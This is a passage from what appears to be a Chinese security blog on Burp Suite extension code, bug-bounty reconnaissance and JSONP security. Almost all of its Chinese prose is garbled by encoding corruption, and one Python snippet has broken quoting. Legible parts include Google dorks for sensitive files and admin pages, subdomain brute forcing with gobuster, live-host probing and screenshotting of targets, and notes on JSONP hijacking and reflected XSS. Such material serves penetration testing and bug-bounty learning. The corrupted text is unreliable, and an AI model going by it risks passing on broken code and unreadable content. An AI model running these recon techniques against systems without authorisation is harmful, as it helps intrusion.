åœ¨messageInfoè¿™ä¸ªå‚æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°requestå’Œresponseæ—¥å¿—ã€‚</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">processHttpMessage</span><span class="params">(self, toolFlag, messageIsRequest, messageInfo)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> toolFlag == <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> messageIsRequest:</span><br><span class="line">                request = messageInfo.getRequest()</span><br><span class="line">                analyzedRequest = self._helpers.analyzeResponse(request)</span><br><span class="line">                request_header = analyzedRequest.getHeaders()</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    method, path = res_path.findall(request_header[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    host = res_host.findall(request_header[<span class="number">1</span>])[<span class="number">0</span>]</span><br><span class="line">                    url = method + <span class="string">" "</span> + host + path</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    url = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> method == <span class="string">"GET"</span>:</span><br><span class="line">                    <span class="keyword">print</span> â€œ[+++++]The URL <span class="keyword">is</span> <span class="string">", url</span></span><br><span class="line"><span class="string">                    print "</span>[+++++]The host <span class="keyword">is</span> <span class="string">",host</span></span><br><span class="line"><span class="string">                    print "</span>[++++] The URI <span class="keyword">is</span> following<span class="string">"</span></span><br><span class="line"><span class="string">                    print path</span></span><br><span class="line"><span class="string">                    for iterm in path.split("</span>/<span class="string">"):</span></span><br><span class="line"><span class="string">                        print iterm</span></span><br><span class="line"><span class="string">                    print "</span>======================================================================================<span class="string">"</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure><p><code>ä»£ç å¦‚ä¸Šæ‰€ç¤ºï¼Œå°±å¯ä»¥æ‰“å°å‡ºURLï¼ŒHOSTï¼ŒURIæ—¥å¿—ä¿¡æ¯</code><br><img src="https://img-blog.csdnimg.cn/20200207154729683.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™æ˜¯ä¸€ä¸ªdemoã€‚å»¶ä¼¸ä¸€ä¸‹ï¼Œæˆ‘ä»¬åœ¨åšæ¸—é€æµ‹è¯•çš„è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€è‹¦äºç›®å½•å­—å…¸ä¸å…¨ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªURIç”Ÿæˆç›®å½•å­—å…¸ï¼Œä¸ºç›®å½•çˆ†ç ´åšå‡†å¤‡ã€‚</p><hr><p>å¦‚æœåšæ‰«æç±»æ’ä»¶ï¼š<br>class BurpExtender(IBurpExtender,IScannerCheck)<br>callbacks.registerScannerCheck(this);<br>å®ç°IScannerCheckåéœ€è¦é‡å†™è¢«åŠ¨æ‰«æçš„å‡½æ•°ã€‚<br>doPassiveScan(IHttpRequestResponse baseRequestResponse) {}<br>doPassiveScanè¿™ä¸ªæ¥å£ï¼Œåœ¨baseRequestResponseè·å–è¯·æ±‚å’Œå“åº”æ•°æ®ï¼Œå¹¶åˆ©ç”¨è¿™äº›æ•°æ®è¿›è¡ŒåŸºäºæ‰«æè§„åˆ™è¿›è¡Œæ‰«æã€‚</p><h1 id="ç¬¬å››æœŸ-SRCæŒ–æ˜"><a href="#ç¬¬å››æœŸ-SRCæŒ–æ˜" class="headerlink" title="ç¬¬å››æœŸ SRCæŒ–æ˜"></a>ç¬¬å››æœŸ SRCæŒ–æ˜</h1><p>é¦–å…ˆå°†å…¬å¸æ¶æ„å§ï¼Œæˆ‘ä»¬å°±ä»¥äº¬ä¸œä¸ºä¾‹å§</p><p>ä¼ä¸šçš„ç»„ç»‡æ¶æ„ä¿¡æ¯å¯é€šè¿‡å¼€æºä¿¡æ¯è·å–ã€‚<br>å¸¸ç”¨çš„æ–¹æ³•ï¼Œé€šè¿‡ç»´åŸºç™¾ç§‘ï¼Œç™¾åº¦ç™¾ç§‘ç­‰ç¡®å®šä¼ä¸šçš„å¤§ä½“ç»„ç»‡æ¶æ„ï¼›<br>zh.wikipedia.org<br>baike.baidu.com</p><p><img src="https://img-blog.csdnimg.cn/20200306154856499.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">ç»“åˆä»¥ä¸‹ç«™ç‚¹ä¿¡æ¯ï¼Œè¿›ä¸€æ­¥ç¡®å®šä¼ä¸šç»„ç»‡æ¶æ„ï¼š<br>å›½å®¶ä¼ä¸šä¿¡ç”¨å…¬ç¤ºç³»ç»Ÿï¼š<a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">http://www.gsxt.gov.cn/index.html</a><br>å¤©çœ¼æŸ¥ï¼š<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a></p><p>å…¬å¸æ¶æ„ç¡®å®šå®Œæˆåï¼Œæˆ‘ä»¬å¼€å§‹è¢«åŠ¨ä¿¡æ¯çš„æ”¶é›†</p><p>è¢«åŠ¨ä¿¡æ¯æ”¶é›†æ˜¯æŒ‡ä¸ä¸ç›®æ ‡ç›´æ¥äº¤äº’ï¼Œé€šè¿‡å…¬å¼€çš„æ¸ é“è·å–è·å–ç›®æ ‡ä¿¡æ¯ã€‚<br>å¯ä»ä»¥ä¸‹å‡ ç‚¹å±•å¼€ï¼ŒDNSä¿¡æ¯æ”¶é›†ï¼Œhttpsè¯ä¹¦ä¿¡æ¯ï¼Œæœç´¢å¼•æ“ï¼Œç½‘ç»œç©ºé—´å®‰å…¨æœç´¢å¼•æ“ï¼ŒåŸºäºå¤‡æ¡ˆèµ„æ–™ä¿¡æ¯æ”¶é›†ã€‚</p><p>DNSä¿¡æ¯æ”¶é›†<br>é€šè¿‡ç›®æ ‡ç«™ç‚¹çš„åŸŸåæ³¨å†Œä¿¡æ¯ï¼Œå¦‚whoisæ—¥å¿—è¿›è¡Œä¿¡æ¯å…³è”ã€‚</p><p>å›½å¤–å¸¸ç”¨çš„whoisæŸ¥è¯¢ç«™ç‚¹ï¼š<br><a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a><br><a href="https://whois.cymru.com/cgi-bin/whois.cgi" target="_blank" rel="noopener">https://whois.cymru.com/cgi-bin/whois.cgi</a><br><a href="https://whois.arin.net/ui/query.do" target="_blank" rel="noopener">https://whois.arin.net/ui/query.do</a></p><p>å›½å†…å¸¸ç”¨çš„whoisæŸ¥è¯¢ç«™ç‚¹ï¼š<br>[å›¾ç‰‡]<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a><br><a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a></p><p>é€šè¿‡whoisæŸ¥è¯¢ç¡®å®šæ³¨å†Œè€…ï¼Œç„¶åå…³è”åŒä¸€æ³¨å†Œè€…çš„å…¶ä»–ç«™ç‚¹ä¿¡æ¯ã€‚</p><p><a href="https://viewdns.info/reversewhois/?q=email@111.com" target="_blank" rel="noopener">https://viewdns.info/reversewhois/?q=email@111.com</a><br><a href="https://whois.chinaz.com/reverse?ddlSearchMode=2" target="_blank" rel="noopener">https://whois.chinaz.com/reverse?ddlSearchMode=2</a></p><p>httpsè¯ä¹¦ä¿¡æ¯ï¼Œå³é€šè¿‡httpsè¯ä¹¦è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå¯é€šè¿‡é‡‡ç”¨ä»¥ä¸‹å‡ ç§æ–¹å¼</p><p>åŸºäºè¯ä¹¦é€æ˜åº¦ä¸¤ä¸ªç«™ç‚¹ï¼š<br><a href="https://certspotter.com/api/v0/certs" target="_blank" rel="noopener">https://certspotter.com/api/v0/certs</a><br><a href="https://crt.sh" target="_blank" rel="noopener">https://crt.sh</a></p><p>ä¸ºæ–¹ä¾¿ä¿¡æ¯å¤„ç†ï¼Œå¯ç¼–å†™è„šæœ¬å¤„ç†ï¼š<br>crtFetch -d example.com</p><p><img src="https://img-blog.csdnimg.cn/2020030615473366.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬çœ‹åˆ°å°±å¯ä»¥æ¢³ç†å‡ºä¸€éƒ¨åˆ†å­åŸŸåä¿¡æ¯äº†<br>è„šæœ¬ä½ç½®ï¼š<a href="https://github.com/3stoneBrother/personalTools/blob/master/scripts/crtFetch.py" target="_blank" rel="noopener">https://github.com/3stoneBrother/personalTools/blob/master/scripts/crtFetch.py</a></p><p>è¯¥è„šæœ¬å¯¹åœ¨çº¿ç«™ç‚¹è·å–çš„åŸŸåè¿›è¡Œæ¸…æ´—ï¼Œå¯è·å–åˆ°å•åŸŸåSSLè¯ä¹¦å’Œé€šé…ç¬¦SSLè¯ä¹¦ä¸¤ç±»ã€‚</p><p>æœ‰æ—¶å€™æˆ‘ä»¬å¯èƒ½å¿½ç•¥çš„åœ°æ–¹ï¼Œæœ‰äº›ä¼ä¸šçš„httpsè¯ä¹¦ä¸­çš„ç›¸å…³åŸŸåå¯åœ¨æµè§ˆå™¨è¯ä¹¦ä¸­ç‚¹å‡»æŸ¥çœ‹ï¼›</p><p><img src="https://img-blog.csdnimg.cn/20200306154605875.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200306154625356.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åŸºäºgoolge hackæŠ€æœ¯å¯ä»¥æŸ¥è¯¢åˆ°å¾ˆå¤šæ•æ„Ÿä¿¡æ¯ã€‚<br>æ›´è¯¦ç»†çš„ç”¨æ³•å¯åœ¨è¿™é‡ŒæŸ¥è¯¢ï¼š<br><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a></p><p>æˆ‘ä»¬å¸¸ç”¨å…³é”®å­—æŸ¥è¯¢ï¼š<br>siteï¼šæœç´¢åŸŸåçš„èŒƒå›´<br>inurlï¼šURLæ ¼å¼<br>intitleï¼šæœç´¢çš„ç½‘é¡µæ ‡é¢˜<br>intextï¼šæœç´¢åŒ…å«å…¶ä¸­æ–‡å­—çš„ç½‘é¡µ<br>filetypeï¼šæœç´¢æ–‡ä»¶çš„åç¼€æˆ–è€…æ‰©å±•å<br>cacheï¼šæœç´¢æœç´¢å¼•æ“é‡Œå…³äºæŸäº›å†…å®¹çš„ç¼“å­˜ï¼Œå¯èƒ½ä¼šåœ¨è¿‡æœŸå†…å®¹ä¸­å‘ç°æœ‰ä»·å€¼çš„ä¿¡æ¯<br>linkï¼šæœç´¢æŸä¸ªç½‘ç«™çš„é“¾æ¥<br>infoï¼šæŸ¥æ‰¾æŒ‡å®šç«™ç‚¹çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯</p><h2 id="ã€æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶ã€‘"><a href="#ã€æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶ã€‘" class="headerlink" title="ã€æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶ã€‘"></a>ã€æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶ã€‘</h2><p>site:xxx.com (filetype:doc OR filetype:ppt OR filetype:pps OR filetype:xls OR filetype:docx OR filetype:pptx OR filetype:ppsx OR filetype:xlsx OR filetype:odt OR filetype:ods OR filetype:odg OR filetype:odp OR filetype:pdf OR filetype:wpd OR filetype:svg OR filetype:svgz OR filetype:indd OR filetype:rdp OR filetype:sql OR filetype:xml OR filetype:db OR filetype:mdb OR filetype:sqlite)</p><h2 id="ã€æŸ¥æ‰¾æ•æ„Ÿç›®å½•åœ°å€ã€‘"><a href="#ã€æŸ¥æ‰¾æ•æ„Ÿç›®å½•åœ°å€ã€‘" class="headerlink" title="ã€æŸ¥æ‰¾æ•æ„Ÿç›®å½•åœ°å€ã€‘"></a>ã€æŸ¥æ‰¾æ•æ„Ÿç›®å½•åœ°å€ã€‘</h2><p>site:xxx.com inurl:login|admin|manage|admin_login|system|user|auth|dev|test<br>site:xxx.com intitle:åå°|ç®¡ç†|å†…éƒ¨|ç™»å½•|ç³»ç»Ÿ</p><p>ä»¥ä¸‹å¯èƒ½æ˜¯æˆ‘ä»¬ä¼šå¿½ç•¥çš„å‡ ä¸ªå…³é”®å­—æŸ¥è¯¢è¯­å¥ï¼š</p><h3 id="åŸºäºå¤‡æ¡ˆå·ï¼Œcopyrightä¿¡æ¯æŸ¥è¯¢"><a href="#åŸºäºå¤‡æ¡ˆå·ï¼Œcopyrightä¿¡æ¯æŸ¥è¯¢" class="headerlink" title="åŸºäºå¤‡æ¡ˆå·ï¼Œcopyrightä¿¡æ¯æŸ¥è¯¢"></a>åŸºäºå¤‡æ¡ˆå·ï¼Œcopyrightä¿¡æ¯æŸ¥è¯¢</h3><p>intext:â€Tesla Â© 2020â€<br>intext:â€äº¬ICPå¤‡11041704å·-15â€</p><h2 id="å¯ä»¥æ­£åˆ™çš„å½¢å¼"><a href="#å¯ä»¥æ­£åˆ™çš„å½¢å¼" class="headerlink" title="å¯ä»¥æ­£åˆ™çš„å½¢å¼"></a>å¯ä»¥æ­£åˆ™çš„å½¢å¼</h2><p>site:dev.<em>.</em>/signin<br>site:<em>/recover-pass<br>site:smtp.</em>.<em>/login<br>site:/com:</em><br>site:/216.75.<em>.</em></p><p>##åŸºäºç«¯å£æˆ–è€…ç«¯å£èŒƒå›´æŸ¥è¯¢<br>site:/com:8443/<br>site:/com:* 8000â€¦9000</p><p>æŸ¥è¯¢åˆ°çš„å…³é”®è¯ï¼Œåˆ©ç”¨å¤‡æ¡ˆä¿¡æ¯å¯ä»¥å¤§è‡´ç¡®å®šå„ä¸ªç«™ç‚¹çš„åŸŸåä¿¡æ¯ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200306155039691.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>curl <a href="http://www.beianbeian.com/search-1/example.html" target="_blank" rel="noopener">http://www.beianbeian.com/search-1/example.html</a> | grep â€œ<br>â€œ |  grep -o â€œwww.\w<em>.\w</em>â€œ | sort | uniq |sed â€œs/www.//gâ€</p><p><img src="https://img-blog.csdnimg.cn/20200306155121441.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸æ–­çš„æ ¹æ®ç½‘ç»œå¤‡æ¡ˆ/è®¸å¯è¯å·è¿›è¡ŒåæŸ¥ï¼Œå³å¯æ¢³ç†æ›´å¤šçš„èµ„äº§ä¿¡æ¯ã€‚<br>ç¡®å®šä¼ä¸šçš„IPæ®µï¼Œå¯åŸºäº<a href="https://bgp.he.net/ç«™ç‚¹è¿›è¡Œæ”¶é›†ã€‚" target="_blank" rel="noopener">https://bgp.he.net/ç«™ç‚¹è¿›è¡Œæ”¶é›†ã€‚</a><br>è¾“å…¥å…¬å¸åç§°å¯æŸ¥è¯¢è¯¥å…¬å¸çš„IPèµ„äº§ä¿¡æ¯ï¼Œç„¶åæ­£åˆ™åŒ¹é…IPæ®µï¼š<br>cat aa.txt| grep -Eo â€œ&lt;td&gt;.<em>?td&gt;â€œ| grep â€œhrefâ€| grep -Eo â€œ([0-9]{1,3}[.]){3}[0-9]{1,3}/</em>[0-9]{0,2}â€</p><h2 id="å¾®ä¿¡å…¬å…±å·"><a href="#å¾®ä¿¡å…¬å…±å·" class="headerlink" title="å¾®ä¿¡å…¬å…±å·"></a>å¾®ä¿¡å…¬å…±å·</h2><p>åŸºäºå…¬ä¼—å·ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥æŒ–æ˜åˆ°å¾ˆå¤šçš„å‚å•†ä¸šåŠ¡ä¿¡æ¯ã€‚å…¬å¸çš„å…¬ä¼—å·ä¿¡æ¯å¯åœ¨sogouæœç´¢å¼•æ“å¯ä»¥è¿›è¡ŒæŸ¥è¯¢ã€‚<br><a href="https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E4%BA%AC%E4%B8%9C" target="_blank" rel="noopener">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E4%BA%AC%E4%B8%9C</a><br>ä¸ºä¾¿äºå¿«é€Ÿæ¢³ç†ï¼Œå¯ç”¨è„šæœ¬å¤„ç†ã€‚<br>python gongzhonghao.py -d â€œç›®æ ‡å…¬å¸â€<br><a href="https://github.com/3stoneBrother/personalTools/blob/master/scripts/gongzhonghao.py" target="_blank" rel="noopener">https://github.com/3stoneBrother/personalTools/blob/master/scripts/gongzhonghao.py</a></p><p><img src="https://img-blog.csdnimg.cn/20200306155403699.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™å°±å¾—åˆ°æŸå…¬å¸çš„æ‰€æœ‰å…¬ä¼—å·ä¿¡æ¯</p><h2 id="ä¸»åŠ¨ä¿¡æ¯æ”¶é›†"><a href="#ä¸»åŠ¨ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸»åŠ¨ä¿¡æ¯æ”¶é›†"></a>ä¸»åŠ¨ä¿¡æ¯æ”¶é›†</h2><p>é€šè¿‡è¢«åŠ¨ä¿¡æ¯æ”¶é›†åˆ°ä¸€æ‰¹åŸŸåï¼ŒIPä¿¡æ¯ã€‚ä»¥ä¸»åŠ¨ä¿¡æ¯æ¯”è¾ƒå®¹æ˜“å¿½ç•¥çš„ä¸‰çº§åŸŸåï¼Œç”šè‡³å››çº§åŸŸåä¸ºä¾‹è¿›è¡Œè¯´æ˜ã€‚é€šé…ç¬¦SSLè¯ä¹¦å¾€å¾€æ˜¯ä¸‰çº§ã€å››çº§åŸŸåé«˜æ•ˆçˆ†ç ´çš„ç›®æ ‡ï¼Œä¸ºæ‰¹é‡å¤„ç†ï¼Œåœ¨crtFetchè„šæœ¬ä¸­æå–äº†éœ€è¦è¿›ä¸€æ­¥çˆ†ç ´çš„ä¸‰çº§ã€å››çº§åŸŸåã€‚</p><p>ç„¶åè¿›è¡ŒåŸŸåçˆ†ç ´ï¼Œçˆ†ç ´å·¥å…·æœ‰å¾ˆå¤šï¼Œä»¥gobusterä¸ºä¾‹è¿›è¡Œæ¼”ç¤ºï¼š<br>gobuster dns -t 30 -w  sub_name.txt -i  -q â€“wildcard -d api.example.com| tee  domains-active.txt</p><p><img src="https://img-blog.csdnimg.cn/20200306155621157.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™äº›ä¸‰çº§å››çº§åŸŸåï¼Œé˜²æŠ¤å¾€å¾€ä¼šè–„å¼±ä¸€äº›</p><p>åŸŸåæ˜¯å¦å­˜æ´»å¯åˆ©ç”¨httprobeå·¥å…·ç¡®å®šã€‚<br>cat domain.txt | httprobe &gt; domain-alive.txt </p><p><img src="https://img-blog.csdnimg.cn/20200306155753708.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹Ÿå¯é€šè¿‡whatwebæŸ¥çœ‹é“¾æ¥çš„æœåŠ¡å™¨ç‰ˆæœ¬ï¼Œæ ‡é¢˜ç­‰ä¿¡æ¯ï¼Œå¤„ç†ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤º<br><img src="https://img-blog.csdnimg.cn/20200306155835844.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸ºä¾¿äºæ‰¹é‡æŸ¥çœ‹URLå†…å®¹ï¼Œæˆ‘ä»¬å¯é€šè¿‡å±å¹•æˆªå›¾å·¥å…·webscreenshotè¿›è¡Œå¤„ç†ã€‚<br>å…·ä½“æ–¹æ³•å¦‚ä¸‹ï¼šé¦–å…ˆå°†å­˜æ´»çš„ç«™ç‚¹æˆªå›¾åˆ°screenshotsæ–‡ä»¶å¤¹ä¸‹é¢ï¼š<br>webscreenshot -i alive.txt -o screenshots -w 20 -m -a â€œX-FORWARDED-FOR:127.0.0.1â€<br>ä¸ºä¾¿äºæµè§ˆï¼Œæˆ‘ä»¬å°†æˆªå›¾ç”Ÿæˆä¸€ä¸ªhtmlæ–‡ä»¶ä¾¿äºåœ¨æµè§ˆå™¨æŸ¥çœ‹ï¼š<br>for I in $(ls -S); do echo â€œ$Iâ€ &gt;&gt; index.htmlï¼›echo â€œ&lt;\ img src=$I&gt;&lt;br&gt;â€ &gt;&gt; index.htmlï¼› done<br>åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ index.htmlæ–‡ä»¶ï¼Œå°±å¯çœ‹åˆ°æ‰€æœ‰çš„ç½‘é¡µæˆªå›¾äº†ã€‚æ•ˆæœå¦‚ä¸‹å›¾ï¼Œæ‰€æœ‰å­˜æ´»ç«™ç‚¹éƒ½åœ¨ä¸€ä¸ªé¡µé¢å±•ç°å‡ºæ¥ã€‚å¯æ ¹æ®ç«™ç‚¹å†…å®¹åšè¿›ä¸€æ­¥çš„æ¸—é€æµ‹è¯•ã€‚</p><hr><h1 id="ç¬¬äº”æœŸ"><a href="#ç¬¬äº”æœŸ" class="headerlink" title="ç¬¬äº”æœŸ"></a>ç¬¬äº”æœŸ</h1><p>&emsp;&emsp; åœ¨ä¼ä¸šçº§åº”ç”¨å¼€å‘ä¸­ï¼Œç»å¸¸ä¼šé‡åˆ°è·¨åŸŸæ•°æ®äº¤äº’çš„é—®é¢˜ï¼Œä¾‹å¦‚å¤šä¸ªå­é›†åº”ç”¨ä¹‹é—´é€šè¿‡è·¨åŸŸè·å–ç”¨æˆ·ç™»å½•çŠ¶æ€åŠèº«ä»½ä¿¡æ¯ç­‰ï¼Œä»è€Œèƒ½å¤Ÿæ»¡è¶³ç°ä»£webåº”ç”¨ä¸­çš„å®é™…éœ€æ±‚ã€‚å› æ­¤è°ˆåˆ°è·¨åŸŸå°±è¦äº†è§£ä¸‹æµè§ˆå™¨çš„åŒæºç­–ç•¥ã€‚<br>&emsp;&emsp; æµè§ˆå™¨çš„åŒæºç­–ç•¥ï¼ˆSame Origin Policy,SOPï¼‰,åŒæºè¦æ±‚ä¸¤ä¸ªé¡µé¢å…·æœ‰ç›¸åŒçš„åè®®ã€åŸŸåã€ç«¯å£å·ã€‚å½“Aåº”ç”¨(<a href="https://www.a.com)æƒ³è¯·æ±‚Båº”ç”¨(https://www.b.com)é‡Œé¢çš„æŸä¸ªæ¥å£" target="_blank" rel="noopener">https://www.a.com)æƒ³è¯·æ±‚Båº”ç”¨(https://www.b.com)é‡Œé¢çš„æŸä¸ªæ¥å£</a>(æäº¤æ“ä½œï¼‰æˆ–è€…è¯»å–æ¥å£è¿”å›çš„æ•°æ®ä½œè¿›ä¸€æ­¥çš„å¤„ç†çš„è¯ï¼Œè¿™æ—¶å°±éœ€è¦è€ƒè™‘è·¨åŸŸé—®é¢˜äº†ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æµè§ˆå™¨ä¼šé˜»æ­¢è¿™ç§ä¸å®‰å…¨çš„è·¨åŸŸè¡Œä¸ºã€‚ä½†åœ¨htmlè¯­è¨€ä¸­ï¼Œæœ‰äº›æ ‡ç­¾æ˜¯å…·å¤‡å¤©ç„¶çš„è·¨åŸŸåŠŸèƒ½çš„ï¼Œæ¯”å¦‚&lt;script&gt;ã€&lt;img&gt;ã€&lt;iframe&gt;ç­‰æ ‡ç­¾æ˜¯å¯ä»¥ç›´æ¥è·¨åŸŸè¯·æ±‚å…¶å®ƒåŸŸçš„èµ„æºçš„ï¼Œè¿™å°±å‚¬ç”Ÿäº†JSONP(JSON with Padding)ï¼ŒJSONPæœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨äº†&lt;script&gt;æ ‡ç­¾çš„è·¨åŸŸèƒ½åŠ›ã€‚</p><h2 id="JSONPè·¨åŸŸå®‰å…¨å¼€å‘å®è·µæ–¹é¢"><a href="#JSONPè·¨åŸŸå®‰å…¨å¼€å‘å®è·µæ–¹é¢" class="headerlink" title="JSONPè·¨åŸŸå®‰å…¨å¼€å‘å®è·µæ–¹é¢"></a>JSONPè·¨åŸŸå®‰å…¨å¼€å‘å®è·µæ–¹é¢</h2><p>a.com æƒ³è¦è·¨åŸŸè¯»å–b.comä¸‹çš„/getinfoçš„è¿”å›æ•°æ®ï¼Œa.comå‰ç«¯ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp_callback</span><span class="params">(msg)</span></span>&#123;      </span><br><span class="line"> <span class="keyword">do</span> something();<span class="comment">//å›è°ƒå‡½æ•°ï¼Œè‡ªå®šä¹‰è¯»å–æ•°æ®åç»­æ“ä½œ    </span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src =<span class="string">"http://b.com/getinfo?callback=jsonp_callback"</span> type=<span class="string">"text/javascript"</span> &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>b.comåå°ç¤ºä¾‹ä»£ç å¦‚ä¸‹ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value=<span class="string">"/getinfo"</span>,method=RequestMethod.GET)</span><br><span class="line">@ResponseBody</span><br><span class="line"><span class="keyword">public</span> String getToken(@RequestParam(<span class="string">"callback"</span>) String callbackFunction)&#123;  </span><br><span class="line"><span class="keyword">return</span> callbackFunction+<span class="string">"&#123;\"result\":&#123;\"data\":&#123;\"token\":\"18623163885dedec5decbab1.37745340\"&#125;&#125;&#125;;"</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>åˆ™æ­¤æ—¶ è€Œæ­¤æ—¶b.com å“åº”æŠ¥æ–‡è¿”å›çš„jsonæ•°æ®ä¸ºï¼šjsonp_callback({â€œresultâ€:{â€œdataâ€:{â€œtokenâ€:â€18623163885dedec5decbab1.37745340â€}}});ç„¶åa.comèƒ½å¤Ÿè·å–è¿”å›çš„æ•°æ®</p><hr><h2 id="jsonpå¼€å‘å®è·µä¸­ç»å¸¸ä¼šå‡ºç°çš„ä¸€äº›é—®é¢˜"><a href="#jsonpå¼€å‘å®è·µä¸­ç»å¸¸ä¼šå‡ºç°çš„ä¸€äº›é—®é¢˜" class="headerlink" title="jsonpå¼€å‘å®è·µä¸­ç»å¸¸ä¼šå‡ºç°çš„ä¸€äº›é—®é¢˜"></a>jsonpå¼€å‘å®è·µä¸­ç»å¸¸ä¼šå‡ºç°çš„ä¸€äº›é—®é¢˜</h2><ol><li><p>æœªæ­£ç¡®è®¾ç½®å“åº”æŠ¥æ–‡å¤´Content-Type è€Œå¯¼è‡´çš„åå°„å‹XSSä¸€èˆ¬æ¥è¯´ï¼Œé»˜è®¤çš„å“åº”æŠ¥æ–‡å¤´<code>Content-Type:text/html</code>ï¼Œåˆ™æ­¤æ—¶å®¹æ˜“äº§ç”Ÿåå°„å‹xssï¼Œä»è€Œè¿›ä¸€æ­¥è·å–æ•°æ®ã€‚å› æ­¤æˆ‘ä»¬å¯é€šè¿‡è®¾ç½®Content-Typeä¸º<code>application/json</code>æŒ‡æ˜è¿”å›çš„æŠ¥æ–‡ä½“æ˜¯jsonæ ¼å¼çš„ï¼Œé¿å…æµè§ˆå™¨è§£ææ‰§è¡Œã€‚è¿™ä¸ªä¸»è¦æ˜¯åç«¯æ˜¯æ ¹æ®å‰é¢ä¼ å…¥çš„callbackå‚æ•°çš„ï¼Œå› æ­¤å¯èƒ½å¯¼è‡´åå°„å‹xss ã€‚</p></li><li><p>JSONPåŠ«æŒï¼šæœ‰äº›webåº”ç”¨ï¼Œå°¤å…¶æ˜¯åŒåŸŸåä¸‹çš„ä¸åŒå­åŸŸä¹‹é—´ï¼Œé€šè¿‡JSONPæ–¹å¼ä¼ è¾“æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·ä¿¡æ¯ã€æ”¯ä»˜ä¿¡æ¯ã€é‰´æƒtokenç­‰ï¼Œå°±è¦å…³æ³¨JSONPåŠ«æŒé—®é¢˜äº†ã€‚</p></li></ol><p>ä¸€ä¸ªç®€å•çš„åŠ«æŒçš„ä»£ç ç‰‡æ®µï¼Œå¯¹äºè¿™ç§jsonpåŠ«æŒé—®é¢˜ï¼Œä¸€èˆ¬ä¼ä¸šæ˜¯å¯¹è¿”å›çš„æ•°æ®åšäº†è„±æ•å¤„ç†ã€‚å°¤å…¶å¯¹äº å§“å èº«ä»½è¯å· æ‰‹æœºå· 